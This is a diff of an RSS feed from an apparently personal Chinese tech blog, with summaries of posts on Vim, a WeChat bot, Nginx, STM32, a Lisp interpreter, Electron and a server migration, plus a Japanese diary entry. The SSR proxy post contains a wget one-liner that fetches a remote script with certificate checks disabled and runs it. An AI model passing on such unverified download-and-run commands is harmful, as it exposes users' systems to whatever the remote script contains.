+      <description>Ertuil VIM 配置 版本： 2.0.3&#xA;最近重新配置了 VIM 的配置文件。删除了瞎 JB 配置的东西。并配置主要以 &amp;lt;SPC&amp;gt; 的一系列快捷键。特此写下此防呆备忘录，方便在其他环境配置。&#xA;使用的插件有：&#xA;Plugin &amp;lsquo;VundleVim/Vundle.vim&amp;rsquo; Plugin &amp;lsquo;The-NERD-tree&amp;rsquo; Plugin &amp;rsquo;taglist.vim&#39; Plugin &amp;lsquo;AutoComplPop&amp;rsquo; Plugin &amp;lsquo;haya14busa/incsearch.vim&amp;rsquo; Plugin &amp;lsquo;Syntastic&amp;rsquo; Plugin &amp;lsquo;The-NERD-Commenter&amp;rsquo; Plugin &amp;rsquo;lrvick/Conque-Shell&#39; Plugin &amp;lsquo;vim-airline/vim-airline&amp;rsquo; Plugin &amp;lsquo;vim-airline/vim-airline-themes&amp;rsquo; Plugin &amp;lsquo;kien/ctrlp.vim&amp;rsquo; Plugin &amp;lsquo;davidhalter/jedi-vim&amp;rsquo; 安装 git 将此仓库拖到本地 .vim 文件 使用如下命令安装 vundle git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim 在vim 中运行 :PluginInstall 快捷键使用 快捷键作用 &amp;lt;SPC&amp;gt; + w 保存文件 &amp;lt;SPC&amp;gt; + q 关闭缓存区 &amp;lt;SPC&amp;gt; + o 分页打开新文件 &amp;lt;SPC&amp;gt; + p 上翻页 &amp;lt;SPC&amp;gt; + n 下翻页 &amp;lt;SPC&amp;gt; + j/k/h/l 移动到上下左右窗口 &amp;lt;SPC&amp;gt; + u + h/j/k/l 上下左右调整窗口大小 &amp;lt;SPC&amp;gt; + f 文件搜索等 &amp;lt;SPC&amp;gt; + d 文件管理 &amp;lt;SPC&amp;gt; + s 查找 &amp;lt;SPC&amp;gt; + v 打开关闭显示行号 &amp;lt;SPC&amp;gt; + m 打开 Ertuil VIM 帮助文档 快速跳转相关 快捷键作用 &amp;lt; C-A &amp;gt; 跳转到行头 &amp;lt; C-E &amp;gt; 跳转到行尾 &amp;lt; C-K &amp;gt; 从当前字符删除到行尾 &amp;lt; C-U &amp;gt; 从当前字符删除到行头 git 相关 快捷键作用 &amp;lt;SPC&amp;gt;ga git add * &amp;lt;SPC&amp;gt;gc git commit -m &amp;lt;SPC&amp;gt;gg git add * &amp;amp;&amp;amp; git commit -m &amp;lt;SPC&amp;gt;gm git merge &amp;lt;SPC&amp;gt;gp git push &amp;lt;SPC&amp;gt;gP git pull 插件快捷调用 快捷键作用 &amp;lt;SPC&amp;gt; + d 打开关闭文件处理器 &amp;lt;SPC&amp;gt; + t 打开关闭 tlist 窗口 &amp;lt;SPC&amp;gt; + e 打开 debug 窗口 &amp;lt;SPC&amp;gt; + r 编译并且运行 &amp;lt;SPC&amp;gt; + c 注释和取消注释 &amp;lt;SPC&amp;gt; + x 新建窗口 打开终端 &amp;lt;SPC&amp;gt; + X 新建标签 打开终端 &amp;lt;SPC&amp;gt; + a 打开自动补全 &amp;lt;SPC&amp;gt; + A 关闭自动补全 注意：在终端下使用 &amp;lt;C-_&amp;gt; 作为功能键。</description>
+    </item>
+    <item>
+      <title>技术摘要| itchat 实现微信智能机器人</title>
+      <link>https://www.elliot98.top/post/tech/itchat-%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E6%99%BA%E8%83%BD%E6%9C%BA%E5%99%A8%E4%BA%BA/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/itchat-%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E6%99%BA%E8%83%BD%E6%9C%BA%E5%99%A8%E4%BA%BA/</guid>
+      <description>itchat 实现微信智能机器人 GitHub https://github.com/andytt/WeChat_auto_robot&#xA;思路 晚上已经有不少itchat+图灵机器人实现个人小助手的Code了。这里添加了更细致的控制、发送问候、撤回消息检测等等功能&#xA;功能 可以智能回复对话，并可以查询天气、新闻、火车、飞机…… 群聊中，如果被@，也能够智能回话 好友发送等图片、文件等被自动缓存，并发送到“文件小助手” 可以监控撤回的消息 每日可以定时向群或者好友发送天气和新闻 可以通过手机微信，远程配置程序。 可以自定义小助手的名称、称呼方式、修改城市等…… 使用 1. 安装itchat库，使用python3.6&#xA;2. 在图灵机器人网注册并生成机器人，将apikey替换层自己的&#xA;3. 将wechat.py中的部分配置按照自己的需求修改&#xA;3. 运行python程序，扫二维码登陆微信。&#xA;配置信息 robot_on ： 配置时候需要打开小助手&#xA;group_on ： 小助手接受群消息开关&#xA;retrieve_on ： 监控撤回消息开关&#xA;apikey ： 在图灵机器人网注册后生成自己的&#xA;robot_name ：定义小助手名称&#xA;self_name ：定义自己的名称&#xA;call_name ：对使用者的称谓&#xA;max_list ：当获取的新闻、菜单条目较多时，最多输出的条目&#xA;self_local ： 本地地址&#xA;ask_list ：每日推送的群列表&#xA;ask_time ： 每日推送时间&#xA;总结 这次算是学习了下itchat这个python库。之后python风格要更加pythonic才好！</description>
+    </item>
+    <item>
+      <title>技术摘要| Nginx 参数优化、http强制跳转以及负载平衡</title>
+      <link>https://www.elliot98.top/post/tech/nginx-%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BC%98%E5%8C%96/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/nginx-%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BC%98%E5%8C%96/</guid>
+      <description>Nginx 参数优化、http强制跳转以及负载平衡 Nginx 作为一个非常好用的 web 服务器，被广泛运用在服务器部署的最前端或者是高可用集群下的 Keeplived 等之后，用作静态文件服务器，反向代理等。&#xA;Nginx 安装、常用命令以及配置文件 一般使用软件包管理安装较为方便，安装完成之后，启动服务以及开机自启：&#xA;yum install -y nginx&#xD;systemctl enable nginx&#xD;systemctl start nginx 其主要配置文件主要在 /etc/nginx 中。 在这个配置文件中，通常会导入 /etc/nginx/conf.d/ 或者 /etc/nginx/site-enable/ 文件夹下的子配置文件。&#xA;在修改配置之后，通常使用下面命令来检查配置文件以及使其生效：&#xA;nginx -t # 检查配置文件&#xD;nginx -s reload # 重新载入配置文件 另外可以使用 -v 参数来查看 Nginx 版本。以及 -V 来获取更多版本信息（包括编译的模块等）。&#xA;全局配置 Nginx 的全局配置有如下重点参数：&#xA;user nginx; # 当前用户，最好不要使用 root&#xD;worker_processes auto; # 工作进程数，可配置为 CPU 逻辑核数&#xD;pid /run/nginx.pid; # pid 文件位置 之后是 event 域。这里指定了 Nginx 事件驱动模型，常用 epoll 。每个进程的最大连接数为 1024 一般无需修改。</description>
+    </item>
+    <item>
+      <title>技术摘要| STM32 GCC 编译模版</title>
+      <link>https://www.elliot98.top/post/tech/stm32-gcc-%E7%BC%96%E8%AF%91%E6%A8%A1%E7%89%88/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/stm32-gcc-%E7%BC%96%E8%AF%91%E6%A8%A1%E7%89%88/</guid>
+      <description>STM32 GCC 编译模版 作者 ———— Ertuil github地址： https://github.com/andytt/stm32_template&#xA;介绍 这里是我在Mac环境上使用 gcc-arm-none-eabi编译时候，使用的模版。其中包含了一个makefile，可以编译、烧写stm32程序。有三个框架分别支持：stm32F103R8T6、stm32F407ZET6以及stm32F103R8T6带DSP库。全部在Mac OS10.13 上测试通过，理论上linux也能使用。&#xA;目录介绍 基本与原子的目录相同：&#xA;USER/ 用户文件（建议代码放在此处）、stm32fxxx_conf、stmfxxx_it、stmfxxx等 BUILD/ 编译时产生文件 CORE/ arm 内核文件 FWLIB/ stm32 标准库文件 SYSTEM/ 原子提供的一部分.c .h 文件 HARDWARE/ 硬件相关的代码文件（建议硬件代码放在此处） makefile makefile文件，需要根据自己情况配置配置。 使用和Makefile文件配置 需要安装的软件等 Unix、Linux上编译stm32文件，需要安装arm-none-eabi-gcc库。具体方法不再赘述。 我使用st-link-v2下载代码至单片机。需要安装st-link的命令行工具 Makefile文件配置 我这里使用的 Makefile 文件大体上是由 Stm32Cube自动生成的文件修改而成。常用的需要修改配置的的地方如下：&#xA;TARGET： 输出文件名 DEBUG： 时候开启debug OPT： 优化等级 BUILD_DIR： 编译文件存放位置，默认build BINPATH： gcc-arm-none-eabi/bin的位置 C_INCLUDES： C头文件位置 注意&#xA;对于不同型号的单片机，可能需要替换STM32F103R8Tx_FLASH.ld、startup_stm32f103xb.s两个.ld、.s文件为自己单片机对应型号的文件。对应的makefile变量为：ASM_SOURCES和LDSCRIPT 如果引入库，则适量修改即可。 Make命令： make： 编译所有文件，生成.bin,.elf二进制文件 make flash：使用st-flash命令把.bin 下载到单片机0x8000000处，（使用openocd等工具时需要自行修改命令） make clean：删除所有编译生成的文件。 关于调试： 使用 arm-none-eabi-gdb和 st-utils 配合使用可以很方便的进行调试。st-utils打开调试服务器，gdb连接服务器来调试。</description>
+    </item>
+    <item>
+      <title>技术摘要| 一个比较完整的lisp解释器 lua实现</title>
+      <link>https://www.elliot98.top/post/tech/%E4%B8%80%E4%B8%AA%E6%AF%94%E8%BE%83%E5%AE%8C%E6%95%B4%E7%9A%84lisp%E8%A7%A3%E9%87%8A%E5%99%A8-lua%E5%AE%9E%E7%8E%B0/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/%E4%B8%80%E4%B8%AA%E6%AF%94%E8%BE%83%E5%AE%8C%E6%95%B4%E7%9A%84lisp%E8%A7%A3%E9%87%8A%E5%99%A8-lua%E5%AE%9E%E7%8E%B0/</guid>
+      <description>想法 这两天在看了一些奇怪的书，看完之后突发奇想，就有了这样一个【功能还算完整的】【自创方言的】【函数式】的lisp解释器——erlisp。没有用python，担心性能，所以选择了现学现用lua（实践证明，目前不做任何优化，性能依然完全没有）。&#xA;代码 https://github.com/andytt/erlisp&#xA;功能 作为动态语言，提供了命令行交互和脚本执行两种运行方式。现在在写lua和C/C++的接口。（这是一个运行在虚拟机上的伪虚拟机） 变量类型：number、string、list、boolean、function。list其实就是lua的table，去掉了hash表部分，只保留数组部分。 语法上对 lisp的cda、cdr进行了模拟&amp;hellip;提供了’作为quote的语法糖 对于转义字符全部用%实现了，比如%n%t%a等 作用域：可定义全局globe或者局部变量local，lua对此非常好实现。 if条件分支、for遍历列表、while循环：是的，由于lua对递归次数有限制，我们不能够像普通的函数式语言那样用递归来代替循环，因此提供了面向过程的范式 函数的定义、调用，由于是函数式语言，所以函数可以作为函数参数，可以被函数返回，是第一类变量 对lua5.3中的几个标准库：math、os、io、table、string 进行了封装，部分函数进行了修改。因此可以进行数学运算、时间操作、文件文件夹操作、输入输出及其重定向、列表的删增减改、字符串的查找删除正则表达式等。 提供了一个小小的标准库，定义了一些个人觉得常用的操作。 实现了python的高阶函数：map、filter、reduce、sort、偏函数等。将函数作为参数传入 模块扩展：你可以支持动态的导入.lisp文件，意味着可以按照模块的方法来组织程序。 可以像C/C++支持lua那样，利用lua甚至C/C++来为lisp提供库。 可以有注释 EXAMPLE 几个例子：&#xA;函数式，利用函数构造并返回函数： 运行结果：&#xA;* 普通的程序：筛选法求十万内的所有素数&#xA;结果保存在文档中&#xA;运行需要2.4s左右&amp;hellip;性能上来说爆炸了&amp;hellip; lua同样代码0.01s python 0.03s 优化的c 仅仅需要0.005s。&#xA;交互式界面 定义斐波拉起函数在c.lisp中，被其他文件导入并使用 命令行交互 缺点：&#xA;性能不佳！诸如尾递归之类的地方没优化、本身运行在虚拟机之上…… lua定义的标准库函数与用户定义的lambda函数在本质上有区别&amp;hellip;lua的函数无法完全函数化，可以封装解决&amp;hellip;（下面来实现） 对所有变量地址均保存在表中，没有安全检查 没有提供调试功能、异常处理和并发的功能&amp;hellip;导致了无法现代化的使用 各种命名不规范&amp;hellip;接口不清晰&amp;hellip;第一次使用lua用法不地道（即便是python也无法做到pythonic） 内存管理？栈？垃圾清理？不存在的&amp;hellip;就用lua提供的吧&amp;hellip;太tm难了 字符串中不能够使用”字符，只能用单引号（在之前写了一半的c语言版本中没这个问题） 单引号作为quote语法糖只能用于列表中&amp;hellip;函数作为参数传递的时候，必须要加双引号或者（quote xxx） 总结 算是一次小的尝试吧，从词法分析到到语法分析、从定义域的实现到函数的实现，对程序语言的编译运行的过程有了新的理解和体会，算是一点收获吧。&#xA;这两天先学的lua语法，大体上与python等动态语言类似，还要继续消化吸收。erlisp的细节还需要处理的更加完善和优化，算是我自己的一个小玩具了吧！！&#xA;（甚至想用C重构，作为科大狗的我怕是疯了惹 23333）</description>
+    </item>
+    <item>
+      <title>技术摘要| 关于这个markdown笔记软件（一）——总体的思路和介绍</title>
+      <link>https://www.elliot98.top/post/tech/electron%E5%AE%9E%E7%8E%B0markdown%E7%AC%94%E8%AE%B0%E8%BD%AF%E4%BB%B6/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/electron%E5%AE%9E%E7%8E%B0markdown%E7%AC%94%E8%AE%B0%E8%BD%AF%E4%BB%B6/</guid>
+      <description>关于这个markdown笔记软件（一）——总体的思路和介绍 项目源码 https://github.com/andytt/ErtuilEditor&#xA;目录 [关于这个markdown笔记软件（一）——总体的思路和介绍](https://blog.csdn.net/ertuil/article/details/78970359)&#xA;[关于这个markdown笔记软件（二）——模型层设计](https://blog.csdn.net/ertuil/article/details/78970413)&#xA;[关于这个markdown笔记软件（三）——视图层设计](https://blog.csdn.net/ertuil/article/details/78970951)&#xA;[关于这个markdown笔记软件（四）——md的渲染和生成](https://blog.csdn.net/ertuil/article/details/78971385)&#xA;[关于这个markdown笔记软件（五）——electron库](https://blog.csdn.net/ertuil/article/details/78972309)&#xA;[关于这个markdown笔记软件（六）——应用逻辑、electron对话框](https://blog.csdn.net/ertuil/article/details/78973199)&#xA;[关于这个markdown笔记软件（七）——其他细节、总结](https://blog.csdn.net/Ertuil/article/details/78973564)&#xA;介绍 一直想写一个类似 为知笔记、蚂蚁笔记之类的用来记笔记的软件。想来需要有这些需求：&#xA;要支持markdown。&#xA;markdown要能够支持代码高亮和latex数学公式。&#xA;界面至少要过得去、不能太丑。&#xA;能够保存并管理图片、链接等资源。&#xA;能够自动保存，能够调整样式。&#xA;有标签的功能，方便整理。&#xA;最好能够跨平台、有云功能（下一版本实现）。&#xA;Todo List 下一版本可能会有如下优化：&#xA;1. 优化程序逻辑、减少重复的代码。各部分进一步解耦。&#xA;2. 加入对右键的支持操作&#xA;3. 加入用户和云备份的操作&#xA;4. 优化用户界面和操作逻辑、提供设置&#xA;平台 考虑的平台有以下三个：&#xA;C++和qt库编写，需要自己造轮子、开发周期太长，调试麻烦。 python+wxpython、pyqt等GUI库。python下有已经比较完备等markdown库，也能够跨平台，可以直接使用很方便。不过考虑这些库默认界面其实不大好看。（迷） 使用node.js中的nw.js 或者electron库来写。 最终选择了第三种方案，前端界面就是html+Javascript+css的网页框架，使用bootstrap框架的话就能够实现还不错的界面效果。程序逻辑自然就是使用Javascript来写，node.js也有不错的性能、markdown库也有，实现起来不用太麻烦！&#xA;然而问题是：本人对前端技术并不了解，于是只能经常区“段错误”、“栈溢出”等网站求助。&#xA;另一个问题就是electron和nw.js的官网的文档其实不是很全，特别是中文文档基本没有，于是踩了不少坑。&#xA;nw.js VS electron node.js有两个类似的库，都能够用web技术来构建本地程序，两个都有不少大项目在用：&#xA;nw.js：Leanote、mongo的软件、Whatsapp等等……&#xA;electron：github、VScode、Wordpress、atom等都用的这个框架&#xA;看起来好像electron的文档更多、看起来也更好，于是选择了使用这个框架。&#xA;架构 选定了方案之后就要开始选择软件的架构。&#xA;View层：视图层就是html文件，利用bootstrap框架，有着不少很好看的样式、不需要自己绘制图标、定制样式了，也有不少动态效果。&#xA;Model层：其实有几个想法。第一个就是直接使用json文件，但是需要自己造轮子，谈不上多麻烦，但是还是不大乐意。第二个方案就是使用数据库了，最好是本地数据库sqlite3，轻量级，就一个文件，也很好用。然而，这是一个坑，electron对sqlite3不兼容，报错（为此浪费了我 大半天的事件），索性放弃。&#xA;正当我打算动手造轮子的时候，发现了node.js的一个很神奇的库lowdb。说是一个数据库，其实管理的就是一个json文件，使用起来看起来非常方便，CRUD有非常好的支持，稍微封装一下就好。&#xA;Control层：其实没什么好说的，就是JavaScript实现查询数据库、对DOM操作操作，就成了。&#xA;其实当初选用node.js也是想学一下JavaScript，好在语言方面与C++和python都挺像，看看文档，差不多就能摸索摸索了。 </description>
+    </item>
+    <item>
+      <title>技术摘要| 文本数据库Jardb项目总结（一）</title>
+      <link>https://www.elliot98.top/post/tech/%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93jardb%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93jardb%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/</guid>
+      <description>文本数据库Jardb项目总结（一） 项目地址： https://github.com/andytt/jardb&#xA;想法 这两天时间，闲来无事，写了一个基于文件的数据库……用Python写的，效率也不能够有所期望。实现这个数据库，其实是受到了Node.js中有一个lowdb的项目的影响：文本、轻便、API极其好用。不需要支持多线程，不需要支持事务管理，不需要太多的性能。这个数据库主要还是在一些本地应用、小项目里面，提供类似应用配置管理、小型数据存储，给人以方便大概是最大的目的了吧。。。（当然最后的性能测试也超过了我的预期，见后）&#xA;其实写这个项目的时候我也有自己的打算，一来用Python多练练面对对象编程。一来，体验一下开源项目的流程。所以在这个项目里面，我花了不少经历提供了详细的文档和单元测试(96%)，也算是拿出来给大家献丑了。&#xA;其实在已经有一个TinyDb的Py项目了，关注的人挺多，这个项目和我的思路都差不多，自然是需要先好好研究一番，阅读完代码之后，差不多就能够开始自己动手了。&#xA;设计之初我就这个几个初步的考虑，要不要使用引入事件机制、亦或者多线程的实现？大概在写完事件循环的部分之后，放弃了这个想法。倒不是因为实现困难，而是由于我的目标是对标小型化的，本地的数据库，轻便好用才是王道，负担重了反而显得不伦不类。&#xA;存储格式 存储格式的话，json是一个很好的选择：通用、方便、表达能力足够。。。另外一个就是基于pickle模块的二进制文本。最后便是直接存在内存里面。当然，作为一个超轻的框架，加密之类的功能不再实现，虽然也提供了结构，直接暴露了原始的存储格式，稍加封装，就能够实现这些功能了。最初打开数据库的时候，就需要指明数据库的文件位置和存储类型，用类似URL的格式来实现挺好的，比如:&amp;ldquo;json://database.db&amp;rdquo;……&#xA;实现起来不难，用一个父类BaseStorage做接口，提供了write和read两个功能，而后由三个子类，分别实现json、pickle、memory的读写功能就行了。为了安全，存储的时候，都会将之前版本改为‘.bac’文件，且在写入的时候，先写入‘.swp’文件中，希望这样做能够提高一点安全性吧。&#xA;日志 日志模块，在我看来怕是这个框架的一个败笔。。。本来想实现一个适合这个数据库的日志类提供管理，最后却后悔没有直接用logging。。。只有一个类dblogging，其中根据配置的不同，可以选择把日志输出到终端或者是写进日志文件去。。。为了轻耦合，我选择了装饰器的模式：&#xA;def logs(self,func): &amp;#39;&amp;#39;&amp;#39; A decorator If self.log is a file path,logs will be write into it. Otherwise if self.debug is on, logs will be printed in the terminal. You should know that both of them will cause the performance loss, especially when logs are shown in the terminal. &amp;#39;&amp;#39;&amp;#39; def wrapper(*args, **kwargs): if self.log != &amp;#39;&amp;#39;: self.file.write(&amp;#34;Jardb: function [ %s ] \targs:\t&amp;#34; % func.</description>
+    </item>
+    <item>
+      <title>技术摘要| 服务器迁移记录 Seafile 和 Gitea 迁移记录</title>
+      <link>https://www.elliot98.top/post/tech/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%81%E7%A7%BB%E8%AE%B0%E5%BD%95-seafile-%E5%92%8C-gitea-%E8%BF%81%E7%A7%BB%E8%AE%B0%E5%BD%95/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%81%E7%A7%BB%E8%AE%B0%E5%BD%95-seafile-%E5%92%8C-gitea-%E8%BF%81%E7%A7%BB%E8%AE%B0%E5%BD%95/</guid>
+      <description>服务器迁移记录 Seafile 和 Gitea 迁移记录 原因 我长期以来一直使用 滴滴云 作为主力服务器使用，这台服务器是1 core 1 GB 的配置。带宽 10 M，按量计费。有两块 20g 硬盘构成。之所以选用滴滴云主要是价格非常便宜，这个配置只需要 22 块钱一个月，个人用户流量也用不了太多。非常便宜。&#xA;说起回归阿里云的原因，是由于一起事故引发的。前几日，我临时在滴滴云上部署了 iGEM 招新登记系统 系统。我参加了 2018 年的 iGEM 比赛。回国之后自然要招收新的同学，于是临时写了这样的一个网站。过了几天之后，突然在一天崩溃，文件系统损坏。现象是 ip ping 不通，ssh 登录不了，控制台显示机器失联。我从早上8点开始联系客服人员，直到下午三点左右才恢复工作。&#xA;此前，滴滴云也发生过一次乱扣费的现象。这些事情，让我认识到，滴滴云作为新的 IDC 厂家，技术上还是不稳固的。因此决定迁移回阿里云。&#xA;购买服务器 最终购买了一台 2C4GB 的服务器（钱包空了）。并准备开始把之前的服务迁移过来。之前的服务器上一共运行有四个服务，一个自建的博客系统，一个私有云，一个私有 git 库以及临时部署的招新系统。除了博客是 angular 静态页面，其他全部使用 docker 部署，因此迁移起来问题不大。&#xA;转移 Seafile 我使用了很久一段时间的 nextcloud ，可是一直觉得不能很好的真正利用上这个软件，于是决定该用 Seafile ，实测好用。Seafile 使用的官方 docker 镜像。转移主要有几个步骤。&#xA;第一是把镜像中 /shared 下的全部文件通过 scp 或者 rsyne 同步到新服务器对应位置。&#xA;修改 run.sh 把服务器运行起来。我一般习惯测试时使用 tmux 前台跑 docker 镜像。&#xA;docker run -it --name seafile\&#xD;--net mynet\&#xD;--ip 172.</description>
+    </item>
+    <item>
+      <title>技术摘要| 构建具有 netspeerder 加速的 SSR 容器环境</title>
+      <link>https://www.elliot98.top/post/tech/%E6%9E%84%E5%BB%BA%E5%85%B7%E6%9C%89-netspeeder-%E5%8A%A0%E9%80%9F%E7%9A%84-ssr-%E5%AE%B9%E5%99%A8/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/%E6%9E%84%E5%BB%BA%E5%85%B7%E6%9C%89-netspeeder-%E5%8A%A0%E9%80%9F%E7%9A%84-ssr-%E5%AE%B9%E5%99%A8/</guid>
+      <description>构建具有 netspeerder 加速的 SSR 容器环境 本文环境： CentOS 7 以上 第一步——内核配置 BBR： 利用脚本安装 BBR TCP 拥塞控制协议，BBR 协议对于高延迟大带宽的网络有非常好的优化作用，可以明显提高 ShadowSocksR 的使用体验。&#xA;参考链接：&#xA;秋水溢冰 —— 一键安装最新内核并开启 BBR 脚本&#xA;wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh &amp;amp;&amp;amp; chmod +x bbr.sh &amp;amp;&amp;amp; ./bbr.sh 第二步——安装 docker： yum update -y&#xD;yum install docker vim wget git 并开启 Docker 服务：&#xA;systemctl start docker systemctl enable docker 第三步——运行镜像 安装带有 netspeeder加速的。下面示伪代码！&#xA;docker run -d \&#xD;-p 443:8388/tcp \ # 端口号·&#xD;-p 443:8388/udp \ # 端口号·&#xD;-e ROOT_PASS=&amp;#34;pass&amp;#34;\ # 容器 root 密码&#xD;lnterface/ssr-with-net_speeder \&#xD;-s 0.</description>
+    </item>
+    <item>
+      <title>生活日志| 新しい学期へ</title>
+      <link>https://www.elliot98.top/post/life/%E6%96%B0%E3%81%97%E3%81%84%E5%AD%A6%E6%9C%9F%E3%81%B8/</link>
+      <pubDate>Mon, 25 Mar 2019 17:46:13 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/life/%E6%96%B0%E3%81%97%E3%81%84%E5%AD%A6%E6%9C%9F%E3%81%B8/</guid>
+      <description>時間が流れると言われるんです。あと一週間で新学期は始まります。僕にとってこれは大切な後期です。進路を決める学期ですから。&#xA;一年生の時、初めて大学に入学した。一人暮らしの生活が始まった。多くの困難があった。成績も普通でした。確か二年生になった時、たくさん頑張って勉強した。成績も上がった。僕は友達に推薦されてIGEMという国際コンテストに参加した、そして銀賞を手に入れた。この機会で台湾やアメリカに行った、たくさん見習うできた。&#xA;新学期にもともと頑張ろうと思う。深度学習や日本語を習う。僕はさあ、大学院生になりたいです。そして、JLPT　N１試験を参加したいです。&#xA;まだ道路は長いし、油断をするな！</description>
+    </item>
+  </channel>
+</rss>
